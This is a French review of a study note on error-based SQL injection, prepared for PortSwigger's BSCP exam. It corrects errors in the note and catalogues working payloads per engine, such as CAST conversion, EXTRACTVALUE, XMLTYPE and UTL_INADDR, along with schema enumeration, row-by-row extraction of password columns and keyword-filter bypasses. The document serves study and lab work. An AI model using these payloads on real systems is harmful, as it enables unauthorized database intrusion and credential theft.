# Revue de la note Error-based SQL injection (Error-based SQLi) (deuxième passe)

Périmètre : revue documentaire de `/home/capss/web-bscp/BSCP-Vault/01-Server-side/SQL Injection/Error-based SQL Injection.md` (221 lignes, relue en entier dans son état actuel), comparée à `SQL-injection.md`, `Blind-SQL-injection.md`, `SQL-injection-Union-Attacks.md` et à la section "SQL injection - Error-based" de `/home/capss/web-bscp/BSCP-Vault/04-Essential-skills/Payloads-cheatsheet.md` (lignes 403 à 528, références SQL-E1 à SQL-E25).
Aucune requête n'a été envoyée, aucune note n'a été modifiée. Les numéros de ligne renvoient à la note Error-based, sauf mention contraire.
Les corrections signalées dans la partie 1 reposent sur le comportement documenté des moteurs, pas sur un test. La section des labs reste dans son état actuel et n'est pas traitée ici, hormis une incohérence signalée au point 1.9.

---

## 1. Ce qui manque ou est flou

### 1.1 Erreurs de contenu à corriger (priorité haute)

1. Ligne 63 (exemple SQL Server) : `... THEN 1/0 ELSE 'a' END ...`. Sur SQL Server, le type d'un `CASE` est celui de la branche de plus haute priorité (ici `int`). La valeur `'a'` de la branche `ELSE` est donc convertie en entier et échoue, même quand la condition est fausse : l'oracle ne distingue plus rien. Cet exemple reprend la forme de la documentation PortSwigger mais mélange les types. Utiliser deux branches du même type, comme la note le fait déjà ligne 152 (`ELSE 1` avec `1=(SELECT ...)`), ou `ELSE NULL`.
2. Ligne 119 et SQL-E19 de la cheat sheet (ligne 501) : `CASE WHEN (cond) THEN CAST('a' AS int) ELSE 1 END`. PostgreSQL convertit un littéral constant dès l'analyse de la requête : l'erreur se produit toujours, quelle que soit la condition. Le même mécanisme est déjà expliqué ligne 118 pour `1/(SELECT 0)`. Forme correcte : `CAST((SELECT 'a') AS int)`, la sous-requête empêchant l'évaluation à l'avance.
3. Ligne 149 et SQL-E13 de la cheat sheet (ligne 476) : `CONVERT(int,(SELECT name+',' FROM sys.tables FOR XML PATH('')))`. Un `FOR XML PATH('')` renvoie le type `xml`, et la conversion explicite de `xml` vers `int` est refusée avec un message qui ne cite pas la valeur. Il faut passer par une chaîne : `CONVERT(int,CONVERT(varchar(max),(SELECT name+',' FROM sys.tables FOR XML PATH(''))))`. Préciser aussi que les caractères spéciaux sont échappés en entités XML (`&amp;`).
4. Ligne 104 : `JSON_KEYS` est cité parmi les fonctions qui citent la donnée. Le message `Invalid JSON text in argument 1 ...` ne reprend pas de façon fiable la valeur. À retirer. `GTID_SUBSET` et `EXP(~(SELECT ...))` méritent en revanche un vrai payload (voir partie 3).
5. Ligne 139 : "selon les versions, ne cite pas la valeur" est inexact pour `ORA-01722 : invalid number`, qui ne cite jamais la valeur. Dire simplement que cette erreur sert d'oracle de type conditional error.
6. Lignes 90 à 154 : les payloads se terminent par `-- ` avec un espace final, invisible en Markdown et facile à perdre au copier-coller. La cheat sheet utilise `-- -`. Harmoniser sur `-- -` partout.
7. Ligne 161 et `Blind-SQL-injection.md` ligne 75 : la note exclut `randomblob` pour risque de déni de service, alors que la note Blind le propose comme repli de délai SQLite. Incohérence entre les deux notes : choisir une position unique (recommandation : le mentionner une seule fois, dans la note Blind, avec l'avertissement, et ne rien dire dans la note Error-based).

### 1.2 Concepts et mécanismes absents

1. Pourquoi une conversion de type fait apparaître la valeur : le moteur recopie dans le message l'entrée qu'il n'a pas pu convertir. Une phrase suffit, aujourd'hui seul le résultat est montré (lignes 76 à 83).
2. Piège de la valeur numérique : si la donnée lue est une chaîne qui ressemble à un nombre (identifiant, code), la conversion en entier réussit et aucune erreur n'apparaît (PostgreSQL, SQL Server). Il faut préfixer la valeur par un caractère non numérique (`CHR(126)||` sur PostgreSQL, `'~'+` sur SQL Server). Une valeur `NULL` ne produit pas non plus d'erreur : utiliser `COALESCE`. Absent de la note et de la cheat sheet.
3. Piège de la ligne non lue : une erreur dans une sous-requête ne se produit que si l'expression est évaluée. Si la valeur d'origine du paramètre ne correspond à aucune ligne, ou si le moteur ne lit aucune ligne, l'erreur peut ne pas survenir (même logique que le piège `SLEEP` de la note Blind). Deux remèdes à documenter : injecter par concaténation dans la valeur (`'||(SELECT ...)||'`) ou garder une valeur qui existe. Et pour l'oracle de type conditional error : un `FROM <TABLE> WHERE username='x'` sur un utilisateur inexistant renvoie zéro ligne, donc "pas d'erreur", ce qui se confond avec "condition fausse". Vérifier d'abord l'existence de l'utilisateur.
4. Deux formes d'injection à distinguer : forme `AND` (nécessite un booléen, d'où `1=CAST(...)` sur PostgreSQL) et forme par concaténation (`'||(...)||'`, Oracle et autres). La note les mélange sans les nommer. Une section "Choisir la forme selon le contexte" règle ce point, y compris le contexte numérique (pas d'apostrophe) et un `ORDER BY` (`ORDER BY (SELECT CASE WHEN ... END)`).
5. Où lire l'erreur : corps de la réponse, commentaire HTML, champ JSON, header, page d'erreur générique avec seul le code HTTP qui varie. Lire la réponse brute dans Burp, pas le rendu de la page, car les caractères `<`, `&` de la valeur peuvent casser l'affichage.
6. Limites de version et de droits regroupées en un seul tableau (aujourd'hui dispersées) : fonctions XML MySQL depuis 5.1.5, `GTID_SUBSET` depuis 5.6 et absent de MariaDB, `XMLTYPE` qui exige le composant XDB, `UTL_INADDR` soumis aux listes de contrôle d'accès réseau, `CTXSYS` surtout sur les anciennes versions, `STRING_AGG` depuis SQL Server 2017.
7. Contextes d'écriture : en `INSERT` ou `UPDATE`, MySQL en mode strict affiche `Incorrect integer value: '<valeur>' for column ...`, ce qui cite la donnée. À mentionner en une ligne, avec l'avertissement habituel sur les données modifiées. Ligne 87 dit que MySQL ne cite pas la valeur par conversion : vrai en `SELECT` seulement.

### 1.3 Détection

1. Les étapes 1 et 2 (lignes 34 et 35) sont longues et peu précises. Reformuler en une séquence courte : apostrophe seule, deux apostrophes, concaténation neutre, sous-requête sur table inexistante.
2. Manquent les messages de syntaxe qui orientent vers un moteur sans verbose error : `ORA-00923 FROM keyword not found` (Oracle sans `FROM dual`), `ORA-00933`, `ORA-00907`, `Incorrect syntax near` (SQL Server), `syntax error at or near` (PostgreSQL), `near "...": syntax error` (SQLite).
3. Il n'y a pas de test de confirmation de la famille verbose avec une valeur inoffensive (version ou utilisateur courant) avant de viser un mot de passe. L'étape de preuve de concept (ligne 58) gagnerait à y figurer.
4. Le critère "paire vrai et faux trois fois" (ligne 37) est bon ; ajouter qu'un pare-feu applicatif peut répondre 403 sur le payload et pas sur la condition : comparer avec un payload neutre de même forme.

### 1.4 Cas pratiques demandés

**Message d'erreur tronqué.** Aujourd'hui une seule ligne (171). À développer en une section dédiée :
- Causes distinctes : limite de la fonction (XPATH MySQL, 32 caractères dont le préfixe `~`, soit 31 caractères utiles), troncature par l'application (nombre de caractères du message), taille d'un champ d'affichage, longueur de la valeur elle-même.
- Quand l'application recopie la requête complète dans le message, le payload occupe lui-même la place : raccourcir le payload (retirer les espaces superflus, alias courts, `::int` plutôt que `CAST(... AS int)`), supprimer la valeur d'origine du paramètre.
- Extraire par tranches : MySQL `SUBSTRING(<expression>,1,31)`, puis position 32, 63, 94 (pas de 31) ; autres moteurs `SUBSTRING`, `SUBSTR` (Oracle). Documenter la formule : position de départ = 1 + 31 x (rang de la tranche - 1).
- Connaître la longueur avant de découper : par exemple `CAST(CHR(126)||LENGTH(<expression>) AS int)` sur PostgreSQL, qui cite la longueur dans le message.
- Utiliser une fonction dont le message est plus long (`GTID_SUBSET` sur MySQL) quand `EXTRACTVALUE` est trop court.

**Valeur du cookie à vider.** Documenter le pourquoi, pas seulement l'instruction :
- La valeur d'origine (par exemple un identifiant de suivi de 16 à 20 caractères) fait partie de la requête et, selon l'application, du message ou du texte tronqué. La vider libère de la place.
- Contrepartie : une valeur vide ne correspond à aucune ligne ; avec la forme `AND` l'expression peut ne pas être évaluée (point 1.2.3). Si l'erreur disparaît après avoir vidé la valeur, revenir à une valeur existante et raccourcir le payload à la place, ou passer à la forme par concaténation.
- Ne vider que le cookie injecté, laisser le cookie de session intact (déjà dit dans la note Blind, ligne 177, à rappeler en une ligne).

**Requête renvoyant plusieurs lignes.** Ligne 170 dit seulement "une seule ligne". À compléter :
- Pourquoi : l'erreur "plus d'une ligne" (`more than one row`, ORA-01427, `Subquery returns more than 1 row`) se déclenche avant la conversion et masque la valeur.
- Une ligne à la fois par moteur : PostgreSQL `LIMIT 1 OFFSET <N>` (avec `ORDER BY` pour un ordre stable), MySQL `LIMIT <N>,1`, Oracle sous-requête avec `ROWNUM` renommé puis filtré, ou `OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY` (12c et suivantes), SQL Server `TOP 1` avec `NOT IN (SELECT TOP <N> ...)`, ou `ORDER BY 1 OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY` (2012 et suivantes).
- Toutes les lignes d'un coup : `string_agg` (PostgreSQL), `GROUP_CONCAT` (MySQL, limité par `group_concat_max_len`, 1024 par défaut), `LISTAGG` (Oracle, limité à 4000 octets), `STRING_AGG` (SQL Server 2017 et suivants). Coût : la troncature revient aussitôt.
- Avec Burp Intruder : un jeu de charges numérique pour `<N>`, et l'option Grep - Extract pour récupérer la valeur dans le message. Gain de temps pour parcourir les lignes.

**Filtres sur les mots-clés.** Ligne 175 ne donne que deux équivalents. Section dédiée, limitée à ce qui est propre aux erreurs (le principe général est dans `SQL-injection.md`, section "Contournement de filtre") :
- Fonction de conversion filtrée : `CAST` remplacé par `::int` (PostgreSQL) ou `CONVERT` (SQL Server).
- Fonction XML filtrée : `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET`, `EXP(~(...))` sur MySQL.
- Apostrophe filtrée : `0x7e` (MySQL), `CHR(126)` (PostgreSQL, Oracle), `CHAR(126)` (SQL Server), `$$texte$$` (PostgreSQL).
- Division filtrée : passer à `CAST`, `TO_NUMBER` ou `CONVERT` pour l'oracle de type conditional error.
- `SUBSTRING` filtré : `MID`, `SUBSTR`, `LEFT` et `RIGHT`, ou un test par motif (`LIKE '<préfixe>%'`) qui évite toute extraction de sous-chaîne.
- `=` filtré : `LIKE`, `IN`, `BETWEEN`, `>` et `<`.
- `AND` filtré : `&&` (MySQL), ou passer à la forme par concaténation.
- `LIMIT` filtré : `OFFSET`, `FETCH`, `TOP`, ou un filtre sur une clé.
- Espaces filtrés : `/**/`, `%0a`, parenthèses autour des sous-requêtes.
- Commentaire final filtré : `#` (MySQL), ou rééquilibrer la requête avec une apostrophe finale.
- Données avec caractères spéciaux : encoder avant d'afficher (`HEX()` MySQL, `RAWTOHEX` Oracle, `encode(...,'hex')` PostgreSQL), sinon les entités XML ou les caractères non imprimables rendent la valeur illisible.

### 1.5 Contre-mesures (lignes 178 à 184)
- La liste est correcte mais générique et recopie `SQL-injection.md` et `Blind-SQL-injection.md`. Garder les points propres aux erreurs : messages génériques avec journalisation côté serveur (en nommant `display_errors` pour PHP et `customErrors` pour ASP.NET), retrait des droits `EXECUTE` accordés à `PUBLIC` sur `UTL_INADDR` et les paquetages `CTXSYS`, réponses uniformes (même code et même taille), et le rappel que masquer l'erreur ne ferme pas la faille.
- Ajouter : un pare-feu applicatif n'est pas une correction, et la journalisation doit alerter sur les rafales d'erreurs 500.

### 1.6 Pièges BSCP à ajouter ou à reformuler
- Les messages à reconnaître (liste ligne 46 à 52) sont à garder tels quels dans la section Détection, pas dans les pièges.
- Repérer le moteur avant de choisir la fonction (l'ordre de test par moteur gagne du temps à l'examen).
- Payload en cookie : encodage de l'espace, du point-virgule, du signe plus ; ne pas casser le cookie de session.
- Automatiser : Intruder avec Grep - Match sur le début du message d'erreur (`invalid input syntax`, `XPATH syntax error`) et Grep - Extract pour la valeur ; l'oracle de type conditional error se lit sur la colonne Status.
- sqlmap : renvoyer à la règle de la note Blind (ligne 188) plutôt que d'en parler ici.

### 1.7 Cas par moteur qui manquent dans la note
Voir la partie 3 (colonne "Présence"). En résumé : lecture de la ligne de rang N pour chaque moteur, énumération du schéma, version et utilisateur sur MySQL, `GTID_SUBSET` et `EXP(~...)` sur MySQL, `LISTAGG` et énumération du schéma sur Oracle, oracle de type conditional error Oracle par `AND`, par `TO_NUMBER` et par sous-requête multi-lignes, oracle de type conditional error PostgreSQL par sous-requête multi-lignes, oracle de type conditional error SQL Server par `CONVERT`, formes par concaténation, garde de préfixe contre les valeurs numériques.

### 1.8 Limites à énoncer clairement
- SQLite n'a aucune verbose error sur les données : l'énoncer en une ligne (déjà fait ligne 157), garder.
- Les verbose errors supposent que l'application affiche le message ; les conditional errors supposent seulement une différence observable.
- `Duplicate entry` (MySQL) : le nom de la clé varie selon la version (`group_key`, `<group_key>`), donc ne pas chercher une chaîne exacte.

### 1.9 Cohérence des notes (à trancher par l'utilisateur)
- Dans la note Error-based, "Labs PortSwigger" affiche `- [ ] Practitioner ✅ 2026-11-02 (...)` : case non cochée avec une coche. Dans `Blind-SQL-injection.md` (lignes 201 à 207), le lab "Visible error-based SQL injection" est coché le 2026-11-02, alors que son entrée du journal dans la note Error-based est présentée comme "déroulé attendu, à valider lors de la réalisation". Les deux notes ne disent pas la même chose. Aucune modification proposée sur cette section.
- La ligne 69 (message `Unterminated string literal started at position 52 ...`) est un message du pilote JDBC de PostgreSQL, tiré d'un lab. Il illustre bien le cas où l'application recopie la requête complète, mais il est placé comme un principe général : le présenter comme exemple et nommer le pilote.

---

## 2. Ce qui est superflu, redondant ou hors sujet

### 2.1 Redondances
1. Tableau "Types et variantes" (lignes 21 à 27) : répète en résumé ce que disent les sections par moteur, la colonne "Une seule ligne" répète la ligne 170 et la note Blind (ligne 169). À remplacer par une matrice courte "famille x moteur" qui pointe vers les sections, ou à supprimer.
2. Ligne 29 : "il n'est pas recopié ici" est un commentaire d'auteur. Remplacer par un simple lien.
3. Lignes 55 et 56 : répètent les deux familles déjà décrites lignes 14 et 15. Supprimer ou fusionner.
4. Ligne 62 : la dichotomie est expliquée en détail dans la note Blind (lignes 121 à 124). Garder une phrase et un lien.
5. Lignes 66 à 83 ("Extraction de données via des messages d'erreur SQL") : le `CAST` est refait ensuite dans la section PostgreSQL (lignes 109 à 113). Fusionner en une section de principe unique ("Verbose errors : principe"), et ne garder que l'exemple utile (message qui recopie la requête).
6. Section "Automatisation" (lignes 164 à 166) : duplique la note Blind ; la seule information propre (statut 500 contre 200) passe dans Détection ou dans l'oracle de type conditional error.
7. Section "Pièges" : lignes 169 et 170 répètent les sections par moteur, ligne 173 et 174 répètent l'étape 4 de la détection (ligne 37), ligne 176 répète les limites déjà données pour Oracle (lignes 133 et 136). Réduire à des pièges qui n'ont pas de place ailleurs.
8. Prévention (lignes 178 à 184) : voir 1.5.
9. Ligne 64 et ligne 124 : renvois vers le journal des labs ("Un exemple sur Oracle figure dans le journal des labs", "voir aussi le journal des labs") qui n'apportent rien au lecteur. Supprimer.
10. Ligne 161 (point 3 "Exclu") : mention d'un payload volontairement absent ; voir 1.1.7.
11. Cheat sheet : SQL-E11 et SQL-E20 (conditional errors MySQL) et SQL-E4/E8 (variantes de `CAST`) sont des variantes, à regrouper en une seule référence avec une sous-ligne, ou à garder comme alternatives explicitement nommées.

### 2.2 Phrases lourdes ou peu naturelles
- Ligne 13 : "2 familles" devient "deux familles".
- Ligne 16 : la phrase avec (a) et (b) est difficile à lire ; la scinder en deux phrases.
- Ligne 34 : "Si l'erreur apparaît puis disparaît, une erreur de syntaxe a un effet détectable" : reformuler (par exemple "Une erreur avec une apostrophe, qui disparaît avec deux, montre que l'apostrophe est interprétée").
- Ligne 56 : "Une erreur non gérée provoque très souvent une différence dans la réponse" : vague, supprimer.
- Ligne 67 : "des messages détaillées" (accord : "détaillés").
- Ligne 68 : "ici `id` et observer l'erreur" : phrase mal construite.
- Lignes 71 à 74 : le deux-points collé ("L'erreur révèle:", "Technique:") alterne avec le deux-points espacé ailleurs ; harmoniser.
- Lignes 76 à 80 : "en une autre" devient "en un autre" ; "très souvent" apparaît deux fois ; "La convertir en un type incompatible, déclenche" porte une virgule fautive entre sujet et verbe.
- "Fuiter" (lignes 87, 107, 142) est un calque de l'anglais ; préférer "révéler", "citer" ou "afficher".
- "Plier la constante" (ligne 118) est un calque ; écrire "évaluer à l'avance".
- Ligne 98 : "Cette technique dépend de la version" ne dit rien d'utile. Donner la limite concrète : table source d'au moins trois lignes et comportement de `RAND` variable selon la version.
- Ligne 122 : phrase d'introduction qui empile quatre faits sans lien ; en faire une courte liste.
- Ligne 139 : voir 1.1.5.
- Le mot "payload" alterne avec "charge utile" dans la note. Appliquer le glossaire : toujours "payload", et garder en anglais les termes techniques (Error-based SQLi, Blind SQLi, verbose errors, conditional errors, stacked queries, out-of-band, header, allowlist, blocklist, bypass).
- Niveaux de titres : "Extraction de données via des messages d'erreur SQL" et les sections par moteur sont tous au même niveau (H3) sous "Comment exploiter (principe)", sans hiérarchie. Lignes vides en trop aux lignes 84 et 85.

### 2.3 Hors sujet
- Ligne 150 (erreurs de regroupement `HAVING 1=1`) : technique d'énumération ancienne et peu utile en examen ; garder une ligne dans la catégorie verbose errors pour SQL Server, pas un point à part entière.
- Ligne 104, `GTID_SUBSET`, `JSON_KEYS`, `EXP` cités sans payload : soit un payload, soit rien (voir 1.1.4).
- La ligne 29 et le résumé de plusieurs lignes de "Pièges" qui parlent de syntaxe générale (commentaire MySQL, encodage) : déjà traités dans `SQL-injection.md` (lignes 158 à 163). Un renvoi suffit.

---

## 3. Catalogue des payloads error-based

Conventions : `<COLONNE>`, `<TABLE>`, `<UTILISATEUR>`, `<N>` (rang de la ligne ou position du caractère), `<COND>` (condition booléenne), `<POS>` (position de début d'une tranche). Contexte par défaut : chaîne entre apostrophes dans une clause `WHERE`, par exemple un cookie ; en contexte numérique, retirer l'apostrophe initiale. Les payloads se terminent par `-- -` quand ils n'ont pas de forme par concaténation. Dans un cookie ou une URL, encoder l'espace, le point-virgule et les caractères spéciaux.
"Présence" indique si le payload figure déjà dans la note (avec la ligne) et dans la cheat sheet (avec la référence). Les identifiants ci-dessous (V pour verbose errors, C pour conditional errors) sont propres à cette revue ; les références SQL-E26 et suivantes sont proposées pour les payloads à ajouter à la cheat sheet.

Rappel de la structure cible de la note : une section "Verbose errors" (un sous-titre par moteur) puis une section "Conditional errors" (un sous-titre par moteur). La section "Détection" reçoit les payloads de reconnaissance (marquées "Destination : Détection").

### 3.1 Catégorie verbose errors

#### PostgreSQL

**V-PG1 - Conversion en entier avec `CAST`**
- Forme : `' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -`
- Contexte : chaîne dans un `WHERE` ; le `1=` est nécessaire car `AND` exige un booléen.
- Signal : `ERROR: invalid input syntax for type integer: "<valeur>"`.
- Limite : une seule ligne ; aucune erreur si la valeur est un nombre ou si elle est `NULL` (voir V-PG3) ; message parfois tronqué par l'application.
- Destination : Verbose errors, PostgreSQL.
- Présence : note lignes 111 et 113 ; cheat sheet SQL-E4.

**V-PG2 - Opérateur `::`**
- Forme : `' AND 1=(SELECT <COLONNE> FROM <TABLE> LIMIT 1)::int-- -`
- Contexte : identique à V-PG1 ; utile si le mot `CAST` est filtré ou pour raccourcir le payload.
- Signal : identique à V-PG1.
- Limite : mêmes que V-PG1.
- Destination : Verbose errors, PostgreSQL (alternative, ou section filtres).
- Présence : note ligne 114 ; cheat sheet SQL-E8.

**V-PG3 - Garde de préfixe pour valeurs numériques**
- Forme : `' AND 1=CAST(CHR(126)||(SELECT <COLONNE> FROM <TABLE> LIMIT 1) AS int)-- -`
- Contexte : la donnée peut être un nombre en texte (identifiant, code, mot de passe numérique).
- Signal : `invalid input syntax for type integer: "~<valeur>"`.
- Limite : si la valeur est `NULL`, la concaténation donne `NULL` et il n'y a pas d'erreur ; utiliser `COALESCE((SELECT ...),'')`. `CHR(126)` évite aussi l'apostrophe.
- Destination : Verbose errors, PostgreSQL ; rappel dans la section troncature et valeurs numériques.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E26).

**V-PG4 - Ligne de rang N**
- Forme : `' AND 1=CAST((SELECT <COLONNE> FROM <TABLE> ORDER BY 1 LIMIT 1 OFFSET <N>) AS int)-- -`
- Contexte : plusieurs lignes à parcourir ; <N> commence à 0.
- Signal : même message que V-PG1, une ligne par requête.
- Limite : sans `ORDER BY`, l'ordre n'est pas garanti ; Intruder avec jeu de charges numérique pour <N>.
- Destination : Verbose errors, PostgreSQL ; renvoyée depuis la section "plusieurs lignes".
- Présence : citée en prose (ligne 115), pas de payload ; absent de la cheat sheet (proposé SQL-E27).

**V-PG5 - Agrégation de lignes**
- Forme : `' AND 1=CAST((SELECT string_agg(<COLONNE>,',') FROM <TABLE>) AS int)-- -`
- Contexte : lire toutes les lignes en une requête.
- Signal : même message avec la liste complète entre guillemets.
- Limite : le message est souvent tronqué ; préférer V-PG4 si la liste est longue.
- Destination : Verbose errors, PostgreSQL ; section plusieurs lignes.
- Présence : note ligne 115 ; cheat sheet SQL-E17.

**V-PG6 - Énumération du schéma**
- Forme tables : `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET <N>) AS int)-- -`
- Forme colonnes : `' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE>' LIMIT 1 OFFSET <N>) AS int)-- -`
- Contexte : nom des tables et colonnes inconnu.
- Signal : nom cité dans le message.
- Limite : droits de lecture sur `information_schema` ; le schéma `public` est une hypothèse courante, sinon retirer le filtre.
- Destination : Verbose errors, PostgreSQL.
- Présence : absent de la note (seule la version Union existe dans la note Union), absent de la cheat sheet (proposé SQL-E28 et SQL-E29).

**V-PG7 - Version, utilisateur, base courante**
- Forme : `' AND 1=CAST(version() AS int)-- -` ; remplacer par `current_user` ou `current_database()`.
- Contexte : preuve de concept sans lire de données applicatives.
- Signal : `invalid input syntax for type integer: "PostgreSQL ..."`.
- Limite : aucune pour la version ; l'utilisateur courant est une donnée sensible, mais sa lecture suffit comme preuve.
- Destination : Verbose errors, PostgreSQL ; preuve de concept.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E30).

**V-PG8 - Reconnaissance du contexte booléen**
- Forme : `' AND CAST((SELECT 1) AS int)-- -`
- Contexte : première sonde sur une cible PostgreSQL probable.
- Signal : `argument of AND must be type boolean, not type integer`.
- Limite : confirme le moteur et le besoin du `1=`, sans citer de donnée.
- Destination : Détection (et non Verbose errors).
- Présence : note ligne 110 ; cheat sheet SQL-E18.

#### MySQL et MariaDB

Préfixe `0x7e` (caractère `~`) : force l'erreur XPath et évite l'apostrophe.

**V-M1 - `EXTRACTVALUE`**
- Forme : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)))-- -`
- Contexte : MySQL 5.1.5 et suivants, MariaDB.
- Signal : `XPATH syntax error: '~<valeur>'`.
- Limite : 32 caractères affichés, préfixe compris, donc tranches de 31 (`SUBSTRING((SELECT ...),<POS>,31)`).
- Destination : Verbose errors, MySQL et MariaDB.
- Présence : note ligne 90 ; cheat sheet SQL-E5.

**V-M2 - `UPDATEXML`**
- Forme : `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1)),1)-- -`
- Contexte : équivalent de V-M1 si `EXTRACTVALUE` est filtré.
- Signal et limite : identiques à V-M1.
- Destination : Verbose errors, MySQL et MariaDB.
- Présence : note ligne 94 ; cheat sheet SQL-E9.

**V-M3 - Double requête avec `FLOOR(RAND())`**
- Forme : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -`
- Contexte : ancienne technique, à garder en secours quand les fonctions XML sont indisponibles.
- Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`.
- Limite : le nom de la clé dans le message varie selon la version ; la table source doit avoir au moins trois lignes (`information_schema.tables` convient).
- Destination : Verbose errors, MySQL et MariaDB (secours).
- Présence : note ligne 97 ; cheat sheet SQL-E10.

**V-M4 - `GTID_SUBSET`**
- Forme : `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1),0x7e),1)-- -`
- Contexte : MySQL 5.6 et suivants ; utile quand `EXTRACTVALUE` et `UPDATEXML` sont filtrés ou trop courts.
- Signal : `Malformed GTID set specification '~<valeur>~'`.
- Limite : fonction absente de MariaDB ; message plus long que celui de V-M1.
- Destination : Verbose errors, MySQL.
- Présence : citée par son nom ligne 104 sans payload ; absent de la cheat sheet (proposé SQL-E33).

**V-M5 - `EXP(~(...))`**
- Forme : `' AND EXP(~(SELECT * FROM (SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' LIMIT 1) x))-- -`
- Contexte : MySQL 5.5.5 et suivants ; le comportement dépend de la version et fonctionne surtout sur la série 5.
- Signal : `DOUBLE value is out of range in 'exp(~((select ... )))'` avec la valeur dans le texte.
- Limite : une colonne et une ligne ; non adapté à MariaDB.
- Destination : Verbose errors, MySQL (secours).
- Présence : citée par son nom ligne 104 sans payload ; absent de la cheat sheet (proposé SQL-E34).

**V-M6 - Version, utilisateur, base courante**
- Forme : `' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -` ; remplacer par `USER()` ou `DATABASE()`.
- Contexte : preuve de concept.
- Signal : `XPATH syntax error: '~<valeur>'`.
- Limite : 32 caractères ; `@@version` tient dans la fenêtre.
- Destination : Verbose errors, MySQL ; preuve de concept.
- Présence : absent de la note (version seulement dans l'exemple `FLOOR`, ligne 97), absent de la cheat sheet (proposé SQL-E35).

**V-M7 - Énumération du schéma et ligne de rang N**
- Forme tables : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT <N>,1)))-- -`
- Forme colonnes : `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=0x<NOM_EN_HEXADECIMAL> LIMIT <N>,1)))-- -`
- Contexte : schéma inconnu ; le nom de table en hexadécimal évite l'apostrophe.
- Signal : nom cité après `~`.
- Limite : droits sur `information_schema` ; `LIMIT <N>,1` est la syntaxe MySQL de décalage.
- Destination : Verbose errors, MySQL ; section plusieurs lignes.
- Présence : absent de la note, absent de la cheat sheet (proposé SQL-E36).

**V-M8 - Agrégation tranchée**
- Forme : `' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(<COLONNE>) FROM <TABLE>),<POS>,31)))-- -`
- Contexte : lire plusieurs lignes malgré la limite de 32 caractères.
- Signal : tranche de 31 caractères.
- Limite : `GROUP_CONCAT` est borné par `group_concat_max_len` (1024 par défaut).
- Destination : Verbose errors, MySQL ; troncature et plusieurs lignes.
- Présence : tranches citées ligne 92 pour une seule valeur, agrégation absente ; absent de la cheat sheet (rattacher à SQL-E36).

#### Oracle

Toutes les payloads `SELECT` sans table exigent `FROM dual`. `CHR(60)||CHR(58)` produit `<:`, un nom XML invalide.

**V-O1 - `XMLTYPE`, forme `AND`**
- Forme : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT <COLONNE> FROM <TABLE> WHERE username='<UTILISATEUR>' AND ROWNUM=1)||CHR(62))) FROM dual)-- -`
- Contexte : chaîne dans un `WHERE`.
- Signal : `ORA-31011: XML parsing failed`, avec la valeur dans le détail (ligne `LPX-00110: Warning: invalid QName`).
- Limite : une seule ligne ; composant XDB requis (présent par défaut) ; les caractères spéciaux de la valeur sont interprétés comme du XML.
- Destination : Verbose errors, Oracle.
- Présence : note ligne 130 ; cheat sheet SQL-E7.

**V-O2 - `XMLTYPE`, forme par concaténation**
- Forme : `'||(SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual)||'`
- Contexte : valeur de cookie, sans commentaire final.
- Signal : même message que V-O1.
- Limite : même limite que V-O1 ; pas de commentaire nécessaire.
- Destination : Verbose errors, Oracle.
- Présence : note ligne 132 ; cheat sheet SQL-E24.

**V-O3 - `UTL_INADDR.GET_HOST_NAME`**
- Forme : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -`
- Contexte : Oracle sans filtre sur le paquetage.
- Signal : `ORA-29257: host <valeur> unknown`.
- Limite : sur les versions récentes, les listes de contrôle d'accès réseau renvoient `ORA-24247` à la place ; l'exécution doit être autorisée au compte applicatif.
- Destination : Verbose errors, Oracle.
- Présence : note ligne 134 ; cheat sheet SQL-E14.

**V-O4 - `CTXSYS.DRITHSX.SN`**
- Forme : `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -`
- Contexte : Oracle avec Oracle Text installé.
- Signal : `ORA-20000: Oracle Text error` avec la valeur (erreur `DRG-11701`).
- Limite : surtout les anciennes versions ; accès restreint ensuite ; droits `EXECUTE` sur le paquetage requis.
- Destination : Verbose errors, Oracle.
- Présence : note ligne 137 ; cheat sheet SQL-E15.

**V-O5 - Ligne de rang N**
- Forme avec `ROWNUM` : `... (SELECT <COLONNE> FROM (SELECT <COLONNE>, ROWNUM r FROM <TABLE>) WHERE r=<N>) ...` à insérer à la place de la sous-requête de V-O1 ou V-O2.
- Forme 12c : `... (SELECT <COLONNE> FROM <TABLE> OFFSET <N> ROWS FETCH NEXT 1 ROWS ONLY) ...`
- Contexte : plus d'une ligne à lire ; `ROWNUM=1` seul ne permet pas de passer à la deuxième ligne.
- Signal : même message que V-O1.
- Limite : `FETCH` demande Oracle 12c ou plus ; <N> commence à 1 pour `ROWNUM`, à 0 pour `OFFSET`.
- Destination : Verbose errors, Oracle ; section plusieurs lignes.
- Présence : `ROWNUM=1` et `FETCH FIRST` cités (lignes 122), pas de payload de rang N ; absent de la cheat sheet (proposé SQL-E37).

